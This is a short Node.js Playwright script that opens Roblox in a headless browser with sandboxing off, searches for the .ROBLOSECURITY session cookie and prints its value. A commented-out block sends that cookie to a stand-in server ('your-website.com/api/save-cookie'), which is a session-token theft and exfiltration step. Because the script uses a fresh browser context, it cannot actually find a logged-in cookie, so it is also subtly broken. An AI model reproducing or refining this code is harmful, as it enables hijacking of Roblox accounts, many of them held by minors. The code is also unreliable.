const { chromium } = require('playwright');

(async () => {
    console.log("Launching browser...");
    
    // Launch in headless mode (no visible window)
    const browser = await chromium.launch({ 
        headless: true, 
        args: ['--no-sandbox']
    });

    const context = await browser.newContext();
    const page = await context.newPage();

    try {
        // 1. Navigate to Roblox Home
        console.log("Navigating to Roblox...");
        await page.goto('https://www.roblox.com/', { waitUntil: 'networkidle' });

        // 2. Get all cookies from the current session
        const cookies = await page.context().cookies();

        // 3. Look for the security cookie
        const robloxCookie = cookies.find(c => c.name === '.ROBLOSECURITY');

        if (!robloxCookie) {
            console.log("❌ Not logged in. No .ROBLOSECURITY cookie found.");
            console.log("Stopping execution as requested.");
            return; // This stops the script right here
        }

        // 4. If found, print it
        console.log("✅ Logged in! Found .ROBLOSECURITY cookie:");
        console.log(robloxCookie.value);

        // Optional: If you want to send it to your API instead of printing
        /*
        const fetch = require('node-fetch');
        await fetch('https://your-website.com/api/save-cookie', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ cookie: robloxCookie.value })
        });
        */

    } catch (error) {
        console.error("Error:", error.message);
    } finally {
        // 5. Always close the browser
        await browser.close();
    }
})();